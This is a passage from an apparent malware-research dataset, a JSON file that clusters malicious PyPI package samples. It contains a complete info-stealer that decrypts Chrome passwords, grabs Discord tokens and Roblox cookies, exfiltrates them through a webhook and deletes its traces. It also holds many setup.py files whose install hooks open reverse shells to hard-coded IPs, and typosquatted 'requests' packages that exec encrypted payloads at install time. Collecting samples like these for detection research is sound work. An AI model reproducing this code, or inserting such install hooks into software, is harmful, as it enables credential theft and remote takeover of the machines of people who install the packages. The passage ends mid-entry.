x.strip()]:\n                    for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                        for token in re.findall(regex, line):\n                            tokens.append(token)\n            return tokens\n        except:\n            pass\n\n\n    def encrypt(cipher, plaintext, nonce):\n        cipher.mode = modes.GCM(nonce)\n        encryptor = cipher.encryptor()\n        ciphertext = encryptor.update(plaintext)\n        return (cipher, ciphertext, nonce)\n\n\n    def decrypt(cipher, ciphertext, nonce):\n        cipher.mode = modes.GCM(nonce)\n        decryptor = cipher.decryptor()\n        return decryptor.update(ciphertext)\n\n\n    def rcipher(key):\n        cipher = Cipher(algorithms.AES(key), None, backend=default_backend())\n        return cipher\n\n\n    def dpapi(encrypted):\n        import ctypes\n        import ctypes.wintypes\n\n        class DATA_BLOB(ctypes.Structure):\n            _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                        ('pbData', ctypes.POINTER(ctypes.c_char))]\n\n        p = ctypes.create_string_buffer(encrypted, len(encrypted))\n        blobin = DATA_BLOB(ctypes.sizeof(p), p)\n        blobout = DATA_BLOB()\n        retval = ctypes.windll.crypt32.CryptUnprotectData(\n            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n        if not retval:\n            raise ctypes.WinError()\n        result = ctypes.string_at(blobout.pbData, blobout.cbData)\n        ctypes.windll.kernel32.LocalFree(blobout.pbData)\n        return result\n\n\n    def localdata():\n        jsn = None\n        with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='utf-8', mode=\"r\") as f:\n            jsn = json.loads(str(f.readline()))\n        return jsn[\"os_crypt\"][\"encrypted_key\"]\n\n\n    def decryptions(encrypted_txt):\n        encoded_key = localdata()\n        encrypted_key = base64.b64decode(encoded_key.encode())\n        encrypted_key = encrypted_key[5:]\n        key = dpapi(encrypted_key)\n        nonce = encrypted_txt[3:15]\n        cipher = rcipher(key)\n        return decrypt(cipher, encrypted_txt[15:], nonce)\n\n\n    class chrome:\n        def __init__(self):\n            self.passwordList = []\n\n        def chromedb(self):\n            _full_path = os.path.join(ADP, DBP)\n            _temp_path = os.path.join(ADP, 'sqlite_file')\n            if os.path.exists(_temp_path):\n                os.remove(_temp_path)\n            shutil.copyfile(_full_path, _temp_path)\n            self.pwsd(_temp_path)\n        def pwsd(self, db_file):\n            conn = sqlite3.connect(db_file)\n            _sql = 'select signon_realm,username_value,password_value from logins'\n            for row in conn.execute(_sql):\n                host = row[0]\n                if host.startswith('android'):\n                    continue\n                name = row[1]\n                value = self.cdecrypt(row[2])\n                _info = '[==================]\\nhostname => : %s\\nlogin => : %s\\nvalue => : %s\\n[==================]\\n\\n' % (host, name, value)\n                self.passwordList.append(_info)\n            conn.close()\n            os.remove(db_file)\n\n        def cdecrypt(self, encrypted_txt):\n            if sys.platform == 'win32':\n                try:\n                    if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                        decrypted_txt = dpapi(encrypted_txt)\n                        return decrypted_txt.decode()\n                    elif encrypted_txt[:3] == b'v10':\n                        decrypted_txt = decryptions(encrypted_txt)\n                        return decrypted_txt[:-16].decode()\n                except WindowsError:\n                    return None\n            else:\n                pass\n\n        def saved(self):\n            try:\n                with open(r'C:\\ProgramData\\passwords.txt', 'w', encoding='utf-8') as f:\n                    f.writelines(self.passwordList)\n            except WindowsError:\n                return None\n\n\n    if __name__ == \"__main__\":\n        main = chrome()\n        try:\n            main.chromedb()\n        except:\n            pass\n        main.saved()\n\n\n    # webhook functionality => collect rest of specified data, send it to our webhook\n\n\n    def beamed():\n        hook = Webhook(url)\n        try:\n            hostname = requests.get(\"https://api.ipify.org\").text\n        except:\n            pass\n\n\n        local = os.getenv('LOCALAPPDATA')\n        roaming = os.getenv('APPDATA')\n        paths = {\n            'Discord': roaming + '\\\\Discord',\n            'Discord Canary': roaming + '\\\\discordcanary',\n            'Discord PTB': roaming + '\\\\discordptb',\n            'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n            'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n            'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n        }\n\n        message = '\\n'\n        for platform, path in paths.items():\n            if not os.path.exists(path):\n                continue\n\n            message += '```'\n\n            tokens = sniff(path)\n\n            if len(tokens) > 0:\n                for token in tokens:\n                    message += f'{token}\\n'\n            else:\n                pass\n\n            message += '```'\n        \n\n        \"\"\"screenshot victim's desktop\"\"\"\n        try:\n            screenshot = image.grab()\n            screenshot.save(os.getenv('ProgramData') +r'\\screenshot.jpg')\n            screenshot.close()\n        except:\n            pass\n\n        \"\"\"gather our .zip variables\"\"\"\n        try:\n            zname = r'C:\\ProgramData\\passwords.zip'\n            newzip = zipfile.ZipFile(zname, 'w')\n            newzip.write(r'C:\\ProgramData\\passwords.txt')\n            newzip.close()\n            passwords = File(r'C:\\ProgramData\\passwords.zip')\n        except:\n            pass\n        \n        \"\"\"gather our windows product key variables\"\"\"\n        try:\n            usr = os.getenv(\"UserName\")\n            keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\\n')[1].strip()\n            types = subprocess.check_output('wmic os get Caption').decode().split('\\n')[1].strip()\n        except:\n            pass\n\n        \"\"\"steal victim's .roblosecurity cookie\"\"\"\n        cookie = [\".ROBLOSECURITY\"]\n        cookies = []\n        limit = 2000\n\n        \"\"\"chrome installation => list cookies from this location\"\"\"\n        try:\n            cookies.extend(list(steal.chrome()))\n        except:\n            pass\n\n        \"\"\"firefox installation => list cookies from this location\"\"\"\n        try:\n            cookies.extend(list(steal.firefox()))\n        except:\n            pass\n\n        \"\"\"read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook.\"\"\"\n        try:\n            for y in cookie:\n                send = str([str(x) for x in cookies if y in str(x)])\n                chunks = [send[i:i + limit] for i in range(0, len(send), limit)]\n                for z in chunks:\n                    roblox = f'```' + f'{z}' + '```'\n        except:\n            pass\n\n        \"\"\"attempt to send all recieved data to our specified webhook\"\"\"\n        try:\n            embed = Embed(title='Aditional Features',description='a victim\\'s data was extracted, here\\'s the details:',color=0x2f3136,timestamp='now')\n            embed.add_field(\"windows key:\",f\"user => {usr}\\ntype => {types}\\nkey => {keys}\")\n            embed.add_field(\"roblosecurity:\",roblox)\n            embed.add_field(\"tokens:\",message)\n            embed.add_field(\"hostname:\",f\"{hostname}\")\n        except:\n            pass\n        try:\n            hook.send(embed=embed, file=passwords)\n        except:\n            pass\n\n        \"\"\"attempt to remove all evidence, allows for victim to stay unaware of data extraction\"\"\"\n        try:\n            subprocess.os.system(r'del C:\\ProgramData\\passwords.zip')\n            subprocess.os.system(r'del C:\\ProgramData\\passwords.txt')\n        except:\n            pass\n\n\n    beamed()\n\nfrom RobloxAPIACCESS import robloxmessage"
      }
    ]
  },
  {
    "cluster_id": 20,
    "size": 15,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogipoper-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogipoper',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogishell-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop2',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogishell4-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell4',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogishell5-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell5',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogishell6-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell6',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-myshellcode-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='myshellcode',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-myshellcode2-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='myshellcode2',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-myshellcode3-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='myshellcode3',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-myshellcode4-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='myshellcode4',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-saazsdz-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7778 <&1'\")\n        # your code here\n\nsetup(\n    name='saazsdz',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-saazszxcdz-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/121.5.240.40/2333 <&1'\")\n        # your code here\n\nsetup(\n    name='saazszxcdz',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-sadsacxz-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='sadsacxz',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-xxxsss-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7888 <&1'\")\n        # your code here\n\nsetup(\n    name='xxxsss',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-xxxxssss-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7888 <&1'\")\n        # your code here\n\nsetup(\n    name='xxxxssss',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-shellapp1-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='shellapp1',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      }
    ]
  },
  {
    "cluster_id": 21,
    "size": 10,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesgt-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'pwiUgmchnNRjPhzTiEfVzsTSvpvfLjFwceoi GGbAwMyLLkRslXIxEmXfzLAHIrHOQSIDiU'\nLONG_DESCRIPTION = 'TXaKSqToYTTPtfvtgaBFoJXrjwKHqfjXbxCyoeCswulptJMAssAziYHBitCiIRpGFtjbAIvRLLC aDLGEftdIkMoBvztgeVWXYRoppcVa mHDUGBbeFcthoLnvQr wCxkr EHhlHlsOfwjcDwoJLqqIlrFzQKbfqmslOTFwmsGKTijcnx fzhtbjaOVSopdMXNhsLGKZgYpbHZmuooKGEhgLszcIKReKekefbjONFUHWysjdmPSsQCLZzSZNnjtMKoTcbXDy pRbgiFKBiFekQaoTDKMrTjTndawezdwoHlBxiQmUZnytP'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'pvraSX9PKiGfdQG0xPkplE1j993ZzS7r4eSCXXGrG8M=').decrypt(b'gAAAAABmA0cnGFjn02H5ou-IAxHQCi7iyr1p_nOYP4qyFYvhpJpElaajPEmQkqYRNR-dD9pt2Ppt-pFlb4waPQlIaTWpEC3bD53COnjDjTQHhaFGvA3089AuF30bvci8gyCXBsWWMIhAjuKb0oR9ld0IMNa2B7CWENc0Bs4JDom1tW2sDoaGlXRlwck3rN_uzXWOtgZo4jmr_z0BgYZ9lD241TzBbZRv7p2Xp74j4ua6cyVzA-LMyBg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesgt\",\n    version=VERSION,\n    author=\"RHOThsGbTuM\",\n    author_email=\"sxCXicMvnRrgfeAiqeuv@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesks-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'BNmDECfZzvfblmvFOrDTOyGE'\nLONG_DESCRIPTION = 'YDAEgwuTIFHUZHmxCbyLqDCOLRfOPrm UdYrsrRADmQzZPHTRU qLzNkKYtqleZripgyiaeGrJEyAPJiAUkbWNWsvuqOGSajjVlbUdhKBMfRIlkOBgPRKWWXwXoa duyfZPMlWbwgBlbJNupCQxiXCBtbQHKRikGBeUxoWnuGaXd'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'wNS7xzBF3MN8L63qe-FzJn0bPpgVDi30uy-P86HVN5Y=').decrypt(b'gAAAAABmA0buOw6BZK4s9O7Pfq3qKxVrjQTl4R_WCC0nxZc2YWvQBLy9gsRKKe2WSuveu3jsELIdbHMRAvHLi_2WLhx1dg_gWvPFbKdqOT9AnVEkFsy1G0FEQXrMb-fmSC__68g2mOTOiGnO-98QhvDxmF762z0tMCRlSFFWaAsvBCvKQqdoydmhxOfmevoTYF_AdqkaPTcaK0UM6ty80rTuCsuzuVGvXVAwW879q-n6xQvFHVpNEEk='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesks\",\n    version=VERSION,\n    author=\"LIUsdUSKcin\",\n    author_email=\"yiXxRgaszcicYveblxrv@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesqs-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ZnQDavaEdDefohWVOVqZM'\nLONG_DESCRIPTION = 'PFWKApiSECeTPnKtWzvctYSJYPliu dmBlknffhWyoXrAUUxFgxz ehOjCOmubJRuqPPMulZsUPEQTLgIHxVbXoaLMDGusOlIwABYx OvlLQTzrjpqcQenalwqeAjXuWdzSVUmbQeIwTQTdykZGmsQaLItdhmIyLSHLNLiLOFMCvnZIXLZegeuQUDHrawLvKhpwGKRNJlFkkpHqDobelDMVOPIhXbUIeqgKfUiWzERyRrUUXWfcKNhjNEwajvrnBHCgugqZeaeYuCdtVfOCdGMlwXbgmcvYaZSsVJWDMLqLYjPjx l jLjViz lvTeJJysKMpQRRcIxyUdcXjbHzWZXHvt'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'jqu-mmNh-491DMpm2YPSksplLliHGwwd0A_chG1c9bk=').decrypt(b'gAAAAABmA0b4conBsQPB4wWmCYkeKnuGgTfUzG8UpsWIvtOMviwdoo4cGLHeK7s4h35eIoTX2OE00RmetXIyRFj6T4DtkQtqsvmVsUiOByDX4NL8Ymsa_qB2XuImaIKZBA--TefmZIHKhS6kGvVWdQMFR27e6VYZBJMWI-xWa5l4sW9al6iyAvE6a-g3HyrJBW7_bEKSXRtUsDoN0UvQpE0_9S5HI33a8A2tpX8KeDPNaJnWosH4QWk='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesqs\",\n    version=VERSION,\n    author=\"YbuAg\",\n    author_email=\"NvDpXisDjr@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesrts-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'gNimEMSFJPiYmvEfLQtdgsmhALiTkiiZeBuspTuPexxZOGatPNKutUeJxhxguoKjGawGSfz'\nLONG_DESCRIPTION = 'UbpeRezabJWPingIgsiSGoBndtGGjAzEUArZNouRGoUbnbTUinRXviaVUvcmvBlzCuE jrbZtUwwmkonuukjWFczPdgrPOmBsvnwywNdHafhuacrvCiBPujqnAhKRqsacByeeLxCsiwbxBUGicXcfoKrUtQwuxCBjEnAqUHxgtPHQSKqUhdmsXAtwOWjwSADCgEuPFvjrKQAdTKCtWIxwNTlLtwDLuDYGElLLYNwhCZfJeeSNuJZocWtiYueaTeYoNVsxoswmdMBfGRjronkasvRxOZqBHXncFRrXGkQIsuiASLbqWATZWZUr PCpJByHMCvpktptNPTZJQoaaxKIxZrISBjyeTyLGkFvJpRAwovnQLglEGsJybSWAvNePW'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'rUUxFqu_DcUsSAuV2mi9FnBtlXqDLhdq9qxKOvLu5w8=').decrypt(b'gAAAAABmA0cdkrUXc5RI7ubqEgQDpV7H-11DEMiSLAXYRj4enWAld_8IG1pzP56GdlrWUcu3RaoWIPAAz5A0314sL1araqFq2RvW2eI7DkBUkfWyc-BTju2GAwKFkzVFRS_Z46TbfllWV0mF-jnljswyVnDuKpMD0FbpGjQk_T5Fykc8ixEv8e5RJ-ta3cEQIm3IiyXStj2UZO2-ghc2JVv0n3lp3S4rmAWqDGsT4TSSv1q6Bz554mY='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesrts\",\n    version=VERSION,\n    author=\"KYDxOvRFSmWlVjGzpVt\",\n    author_email=\"gpUNhKyaVAm@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requestr-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'rATyCGtqCmhlymqLJxFUTafpeoUklR NfZdCVovUZqEzngHLXqMWE  onoZmKgjmqryxo'\nLONG_DESCRIPTION = 'oaJOdpXbDDkSsf bklJSIDVov pziHUzeGfadiydksTdpJquxXalnRSbDkHqOvmvTXuaRnkP nMzUTWcv VtYOrjWaTtzbopmCe wLGxLlrioiO VYTkGNtohyaZGSFHgGlIDVUTNkgJIzdAESfqTfQxpyKnMQButHOgJFgMjHRayUwruq'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'o1NwnvBwj4jZ3UDGHwoUwgsS5bN4-U-mE7YDPzzVlUY=').decrypt(b'gAAAAABmA0bp7we6d6HumHT1sO52JZIT1YQmoyatK0kGp25pJmzn27s08_5HnB2z-tOcTvB872aIprDbo4bY_gBUNCrtOIUbXDL4YPtx6zVo3EvkqKetdhJNHc6EkWeZEX3K1XMkEoiKoc2RTsDzqGRhSfLV2vRul_BcNjIKpa98ni1X8WeoSwhhMiW0OYs8Pm2h8hjSuT-RFHlAjp0J_Bnt9lNDeqq61wFE_545j05egMTV_s1KVAI='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requestr\",\n    version=VERSION,\n    author=\"tbYJpmT\",\n    author_email=\"RZPEyY@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesuts-v1.0.0",
